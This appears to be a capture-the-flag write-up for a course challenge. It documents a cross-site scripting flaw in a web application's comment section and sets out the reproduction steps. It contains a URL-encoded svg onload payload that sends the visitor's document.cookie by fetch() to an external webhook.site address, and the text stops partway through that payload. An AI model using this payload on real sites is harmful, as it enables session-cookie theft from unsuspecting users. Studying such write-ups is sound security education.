# Challenge `Give_me_more_than_a_simple_WAF` Writeup

- Vulnerability: Cross-Site Scripting (XSS)
  - Exploits a lack of input validation and sanitization, allowing the injection of malicious scripts into the webpage.
- Where: Comment Section
  - The vulnerability is present in the comment section of the webpage, where user input is not properly sanitized.
- Impact: Unauthorized Data Collection
  - Exploiting this vulnerability allows an attacker to inject a script that collects and sends the victim's cookies to an external site controlled by the attacker.
- NOTE: This is a serious security concern as it enables unauthorized data collection from users interacting with the comment section.

## Steps to Reproduce

1. Visit the vulnerable webpage: [http://mustard.stt.rnl.tecnico.ulisboa.pt:23252/)
2. Navigate to the comment section.
3. Insert the following payload in Link of the bug/feature request you want to report on.:
http://mustard.stt.rnl.tecnico.ulisboa.pt:23252/?search=%3Csvg/onload='fetch(%22https://webhook.site/3a9f1629-aa07-4da4-b8b1-890c4834ceaf?c=%22%2Bdocument.cooki

